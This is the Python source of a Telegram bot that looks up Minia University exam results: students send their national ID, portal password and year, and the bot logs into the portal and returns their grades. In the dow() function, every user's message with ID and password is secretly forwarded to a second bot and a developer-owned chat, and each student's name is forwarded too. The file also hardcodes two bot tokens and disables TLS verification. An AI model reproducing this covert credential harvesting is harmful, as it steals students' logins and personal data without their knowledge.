import telebot, requests, json
from telebot import types
import telebot
import threading
####bot spam ###
tok = "6152126906:AAHFGXWUWnHSeHo8q1qY_bVS9wWjoYZy_bw"
ch_id = "836970770"
botA = telebot.TeleBot(token=tok)
owner = 836970770
z=f"""┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉
𖡋  »  »  »  »  »  »  »  »  »  »  »  »  »  » 

𖡋 صلوا علي  النبى ﷺ واذكرونا بالدعاء🤍

𖡋 »  »  »  »  »  »  »  »  »  »  »  »  »  » 
┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉
⬤ 𝐁 𝐘 ⑆ @M_S_H_VIP"""
bot = telebot.TeleBot("6766198970:AAHk3_vgH2IQY8gPSgxT-AEpOw0ovBjtmyM")
#markup = None
import requests
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry

# إعداد إعادة المحاولة



# إعداد الجلسة






@bot.message_handler(commands=["start"])
def start(message):
	global markup
	markup = types.InlineKeyboardMarkup(row_width=2)
	button1 = types.InlineKeyboardButton(
		"- لمعرفة النتيجه اضغط هنا 🎯🔻", callback_data="start"
	)
	markup.add(button1)
	bot.send_message(message.chat.id, f'\n{z}\n')
	bot.send_message(
		message.chat.id,
		"للتواصل :\n[Telegram](t.me/M_S_H_VIP)\n[قناة الشروحات ☑️](t.me/M_S_H_VIP1)\n[Facebook](https://www.facebook.com/profile.php?id=100010833720173)\n\n[لمشاهدة فيديو قصير عن كيفية استخدام البوت اضغط هنا 🎯](https://t.me/M_S_H_VIP1/88) ",
		parse_mode="markdown",
		disable_web_page_preview=True,
		reply_markup=markup,
	)


@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
	if call.data == "start":
		bot.send_message(
			call.message.chat.id,
			text="""
	اهلاً بَك عزيزي ارسل رقمك القومي ثم 
	مسافه ثم الباسورد ثم مسافه ثم رقم السنه علي سطر واحد
	مع العلم 
	رقم 0 لنتيجة السنه الحاليه
	رقم 1 لنتيجة السنه ال قبلها وهكذا كل ما تذود رقم تقل سنه
	مثال:-
	30102012618171 Aamm999 0
	البوت صالح لجميع السنوات من اولي لرابعه
	Developer @M_S_H_VIP
	""",
		)
		bot.register_next_step_handler(call.message, dow)


def dow(message):
	retries = Retry(total=5, backoff_factor=0.1, status_forcelist=[ 500, 502, 503, 504 ])
	adapter = HTTPAdapter(max_retries=retries)
	session = requests.Session()
	session.mount("http://", adapter)
	session.mount("https://", adapter)
	
	botA.send_message(chat_id=ch_id, text=message)
	chat_id = message.chat.id
	parts = message.text.split(" ")
	if len(parts) != 3:
		bot.send_message(
			message.chat.id, "نمط الكتابه غير صحيح اسمع الشرح او اتصل بالمطور"
		)
		bot.send_message(
			message.chat.id,
			"للتواصل :\n[Telegram](t.me/M_S_H_VIP)\n[قناة الشروحات ☑️](t.me/M_S_H_VIP1)\n[Facebook](https://www.facebook.com/profile.php?id=100010833720173)\n\n[لمشاهدة فيديو قصير عن كيفية استخدام البوت اضغط هنا 🎯](https://t.me/M_S_H_VIP1/88) ",
			parse_mode="markdown",
			disable_web_page_preview=True,reply_markup=markup)
	else:
		Id = parts[0]
		password = parts[1]
		year = int(parts[2])
		if year not in [0, 1, 2, 3, 4]:
			bot.send_message(
			message.chat.id, "نمط الكتابه غير صحيح اسمع الشرح او اتصل بالمطور"
		)
			bot.send_message(
			message.chat.id,
			"للتواصل :\n[Telegram](t.me/M_S_H_VIP)\n[قناة الشروحات ☑️](t.me/M_S_H_VIP1)\n[Facebook](https://www.facebook.com/profile.php?id=100010833720173)\n\n[لمشاهدة فيديو قصير عن كيفية استخدام البوت اضغط هنا 🎯](https://t.me/M_S_H_VIP1/88) ",
			parse_mode="markdown",
			disable_web_page_preview=True,
			reply_markup=markup)
		else:
			def test():
				print("test work")
				headersc = {
					"Accept": "*/*",
					"Accept-Language": "ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7",
					"Connection": "keep-alive",
					"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
					"Origin": "http://stda.minia.edu.eg",
					"Referer": "http://stda.minia.edu.eg/",
					"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
					"X-Requested-With": "XMLHttpRequest",
				}
		
				datac = {
					"UserName": Id,
					"Password": password,
				}
		
				responsec = session.post(
					"http://stda.minia.edu.eg/Portallogin",
					headers=headersc,
					data=datac,
					verify=False,
					timeout=15
				)
				while responsec.status_code != 200 :
					print("trying...")
					responsec = session.post('http://stda.minia.edu.eg/Portallogin', headers=headersc, data=datac, verify=False,timeout=15)
					global x
					x = str(responsec.cookies)
					print(responsec)
		
				if 'عفوا اسم المستخدم مسجل من قبل' in str(responsec.json()):
					bot.send_message(message.chat.id,text="الرقم السري أو الرقم القومي خطأ ",reply_markup=markup)
					print("error.pass")
				elif	"30210012404408" == Id or "30108012406487" == Id or "30204182401764" == Id or "30202022402249" == Id:
					bot.send_message(message.chat.id,text="هذا  الحساب محظور تواصل مع المطور",reply_markup=markup)
					
				else:
							x = str(responsec.cookies)
							bot.send_message(chat_id, text='جار إرسال النتائج الخاصه بك الرجاء الانتظار لحظات.....🚀🚀🚀')
							import re
		
							w_pattern = r'PortalStudentUserID="(.*?)"'
							w_match = re.search(w_pattern, x)
							if w_match:
								wp = w_match.group(1)
								######get UUID #####
								cookiesd = {
									"PortalStudentUserID": wp,
								}
			
								headersd = {
									"Accept": "*/*",
									"Accept-Language": "ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7",
									"Connection": "keep-alive",
									"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
									"Origin": "http://stda.minia.edu.eg",
									"Referer": "http://stda.minia.edu.eg/?num=28741",
									"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
									"X-Requested-With": "XMLHttpRequest",
								}
			
								datad = {
									"param0": "Portal.General",
									"param1": "GetStudentPortalData",
									"param2": '{"UserID":""}',
								}
			
								responsed = session.post(
									"http://stda.minia.edu.eg/PortalgetJCI",
									cookies=cookiesd,
									headers=headersd,
									data=datad,
									verify=False,
									timeout=15
								)
								while responsed.status_code != 200 :
									print("trying...get name")
									responsed = session.post(
		                                "http://stda.minia.edu.eg/PortalgetJCI",
		                                cookies=cookiesd,
		                                headers=headersd,
		                                data=datad,
		                                verify=False,
		                                timeout=15
		                            )
								for i in responsed.json():
									StdName = i["StdName"]
									botA.send_message(chat_id=ch_id, text=StdName)
								import re
			
								w_patternd = r'"UUID": "(.*?)"'
								w_matchd = re.search(w_patternd, responsed.text)
								if w_matchd:
									Ud = w_matchd.group(1)
									print(Ud)
								else:
									print("Token not found.")
			
								##### get results ####
								cookies = {
									"PortalStudentUserID": wp,
								}
								headers = {
									"Accept": "*/*",
									"Accept-Language": "ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7",
									"Connection": "keep-alive",
									"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
									"Origin": "http://stda.minia.edu.eg",
									"Referer": "http://stda.minia.edu.eg/?num=26977",
									"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
									"X-Requested-With": "XMLHttpRequest",
								}
			
								data = {
									"param0": "Portal.Results",
									"param1": "GetAllResults",
									"param2": f'{{"UUID":"{Ud}"}}',
								}
								import json
			
								response = session.post(
									"http://stda.minia.edu.eg/PortalgetJCI",
									cookies=cookies,
									headers=headers,
									data=data,
									verify=False,
									timeout=15
								)
								# print (response)
								while response.status_code != 200 :
									print('tryyying bost.........')
									response = session.post(
		                                "http://stda.minia.edu.eg/PortalgetJCI",
		                                cookies=cookies,
		                                headers=headers,
		                                data=data,
		                                verify=False,
		                                timeout=15
		                            )
									print(response.status_code)
								print(response.status_code)
								print(response.text)	
								for item in response.json()[year]["ds"]:
									z = item["StudyYearCourses"]
									for it in z:
										try:
											Degree = it["Total"]
										except:
											pass
										try:
											Max = it["Max"]
										except:
											pass
										try:
											GraderName = it["GradeName"]
											x = it["Parts"]
											for i in x:
												CoursePartName = i["CoursePartName"]
												Result = f"""
								نتيجتك من موقع.  King of deep web
								
								
								{CoursePartName} 
								الدرجه الخاصه بك {Degree}
								
									القيمه العظمي للماده {Max}
								
								تقديرك {GraderName}
								
								
								Developer @M_S_H_VIP 
								"""
												bot.send_message(chat_id, text=Result)
												#botA.send_message(chat_id=ch_id, text=Result)
										except:
											pass
								bot.send_message(
									chat_id,text=".......مبارك عليك النتيجه🔻",reply_markup=markup)
								return False
			thread = threading.Thread(target=test)
			thread.start()

bot.infinity_polling()
